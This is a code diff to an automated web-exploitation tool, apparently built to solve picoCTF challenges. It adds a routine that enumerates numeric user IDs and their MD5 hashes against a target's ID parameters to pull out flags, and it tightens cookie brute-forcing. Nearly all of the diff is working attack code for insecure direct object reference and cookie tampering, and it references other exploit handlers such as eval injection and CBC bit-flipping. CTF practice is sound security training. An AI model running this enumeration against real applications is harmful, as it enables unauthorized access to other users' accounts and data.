@@ -664,6 +664,18 @@ class AutoPwnPipeline:
         if any(any(k in ep.lower() for k in ["check", "search", "cookie"]) for ep in endpoints):
             predictions.append(("cookie_manipulation", 0.85, "Check/search endpoint detected - cookie brute-force surface"))
 
+        # ── 6b. MD5-hashed ID prediction (Hashgate-style) ───────────────
+        # Detect if the app uses MD5-hashed numeric IDs (common in picoCTF Hashgate).
+        # Look for 'id' parameters and MD5-looking values in URLs or source.
+        if any(any(k in p.lower() for k in ["id", "user", "uid", "account"]) for p in params):
+            # Check if any discovered value looks like an MD5 hash (32 hex chars)
+            all_source = html + " " + leaked
+            if re.search(r'\b[a-f0-9]{32}\b', all_source, re.IGNORECASE):
+                predictions.append(("md5_id_bruteforce", 0.9, "MD5 hash detected in source - hashed ID brute-force surface"))
+            # Also detect if the URL contains ?id=<number> (predictable numeric ID)
+            if re.search(r'[?&]id=\d+', self.target_url):
+                predictions.append(("md5_id_bruteforce", 0.85, "Numeric ID in URL - predictable ID brute-force surface"))
+
         # ── 6b. CBC Bit-Flip prediction (encrypted cookies) ─────────────
         # Detect cookies that are base64-encoded and contain high-entropy
         # (encrypted) data - likely CBC-encrypted JSON like picoCTF 'More Cookies'
@@ -750,6 +762,7 @@ class AutoPwnPipeline:
             "eval_injection": self._exploit_eval_injection,
             "cbc_bitflip": self._exploit_cbc_bitflip,
             "cookie_manipulation": self._exploit_cookie_brute_force,
+            "md5_id_bruteforce": self._exploit_md5_id_bruteforce,
             "cors": self._exploit_cors,
             "open_redirect": self._exploit_open_redirect,
             "hpp": self._exploit_hpp,
@@ -888,6 +901,14 @@ class AutoPwnPipeline:
                 self._exploit_cookie_brute_force()
             except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                 print_warning(f"Cookie brute-force failed: {e}")
+
+        # MD5-hashed ID brute-force (Hashgate-style) should also always run,
+        # since it's a common picoCTF pattern (predictable numeric IDs hashed with MD5).
+        if len(self.state.get("captured_flags", [])) == total_flags_before:
+            try:
+                self._exploit_md5_id_bruteforce()
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                print_warning(f"MD5 ID brute-force failed: {e}")
 
         self._exploit_client_side_crypto()
         self._exploit_reasoning_driven()
@@ -1175,14 +1196,29 @@ class AutoPwnPipeline:
             except Exception:
                 pass
 
-        # Always include common parametric cookie names even if not discovered,
-        # since picoCTF-style challenges often use a 'name' cookie set by JS.
-        # We'll try the discovered cookies first, then fall back to common names.
-        common_param_cookies = ["name", "id", "cookie", "user", "user_id", "page", "index", "num", "role"]
-        cookie_names = list(cookies.keys())
-        for c in common_param_cookies:
-            if c not in cookie_names:
-                cookie_names.append(c)
+        # Only brute-force cookies that are ACTUALLY discovered and look parametric.
+        # Do NOT invent common cookie names unless we already have a parametric cookie,
+        # otherwise we waste time on challenges that aren't cookie-based (e.g. Crystal Peak).
+        # A parametric cookie is one whose value looks like a simple index/name (not a JWT/session).
+        discovered_param_cookies = []
+        for cname, cval in cookies.items():
+            cl = cname.lower()
+            # Skip session/JWT/token cookies (not parametric)
+            if any(k in cl for k in ["session", "csrf", "jwt", "token", "flask", "connect.sid"]):
+                continue
+            # A parametric cookie has a short numeric or simple value (e.g. name=-1, id=0)
+            if any(k in cl for k in ["name", "id", "cookie", "user", "page", "index", "num", "role"]):
+                discovered_param_cookies.append(cname)
+            elif cval and (cval.isdigit() or (cval.startswith("-") and cval[1:].isdigit())):
+                discovered_param_cookies.append(cname)
+
+        # If we found parametric cookies, use them. Otherwise, this isn't a cookie challenge.
+        if discovered_param_cookies:
+            cookie_names = discovered_param_cookies
+            print_info(f"  Found parametric cookies: {', '.join(cookie_names)}")
+        else:
+            print_info("  No parametric cookies detected - skipping cookie brute-force.")
+            return
 
         # Define candidate values to brute-force
         # 1. Numeric values - prioritize 0-30 (common in picoCTF cookie challenges)
@@ -1275,6 +1311,64 @@ class AutoPwnPipeline:
                         pass
                 if found_flag:
                     return
+
+    def _exploit_md5_id_bruteforce(self):
+        """
+        Exploit predictable MD5-hashed user IDs (like picoCTF Hashgate).
+        The app hashes a numeric user ID with MD5 and uses it as an identifier.
+        Brute-force IDs in a range (e.g. 3000-3020) and try each MD5 hash.
+        """
+        import hashlib as _hashlib
+        print_info("Exploiting MD5-Hashed ID Brute-Force (Hashgate-style)...")
+        success = False
+
+        # Detect the ID parameter from the current URL or discovered params
+        params = list(self.state.get("parameters", []))
+        id_params = [p for p in params if any(k in p.lower() for k in ["id", "user", "uid", "account", "profile"])]
+        if not id_params:
+            id_params = ["id"]
+
+        # Determine the ID range to brute-force.
+        # Hashgate uses IDs 3000-3020 (20 employees). We'll try a broad range.
+        # If we can detect a base ID from the current URL, start from there.
+        base_id = 3000
+        # Try to extract a numeric ID from the current URL
+        import re as _re
+        m = _re.search(r'[?&]id=(\d+)', self.target_url)
+        if m:
+            base_id = int(m.group(1))
+        # Range: base_id to base_id+30 (covers ~20-30 employees)
+        id_range = range(base_id, base_id + 31)
+
+        # Build candidate URLs: base URL + endpoints with id param
+        candidate_urls = [self.target_url]
+        for ep in self.state.get("endpoints", []):
+            if any(k in ep.lower() for k in ["user", "profile", "account", "dashboard", "home"]):
+                candidate_urls.append(urljoin(self.target_url, ep))
+
+        for url in candidate_urls:
+            for uid in id_range:
+                # Generate MD5 hash of the numeric ID
+                md5_hash = _hashlib.md5(str(uid).encode()).hexdigest()
+                try:
+                    # Try the raw numeric ID first
+                    r = self.session.get(url, params={id_params[0]: str(uid)}, timeout=5)
+                    if self._check_and_store_flags(r.text, f"MD5 ID BF (id={uid}) against {url}"):
+                        print_success(f"  Flag captured with raw ID '{uid}' on {url}!")
+                        return True
+                    # Try the MD5 hash as the ID value
+                    r = self.session.get(url, params={id_params[0]: md5_hash}, timeout=5)
+                    if self._check_and_store_flags(r.text, f"MD5 ID BF (id={md5_hash}) against {url}"):
+                        print_success(f"  Flag captured with MD5 hash '{md5_hash}' (ID {uid}) on {url}!")
+                        return True
+                    # Also check for flag patterns in the response
+                    if _re.search(r'(picoCTF\{[^}]+\}|flag\{[^}]+\}|CTF\{[^}]+\}|FLAG\{[^}]+\})', r.text, _re.IGNORECASE):
+                        print_success(f"  [MD5 ID BF] Flag pattern found for ID {uid} (hash {md5_hash}) on {url}!")
+                        self._check_and_store_flags(r.text, f"MD5 ID BF success (ID {uid})")
+                        return True
+                except Exception:
+                    pass
+        return success
 
     def _exploit_auth_bypass(self):
         """
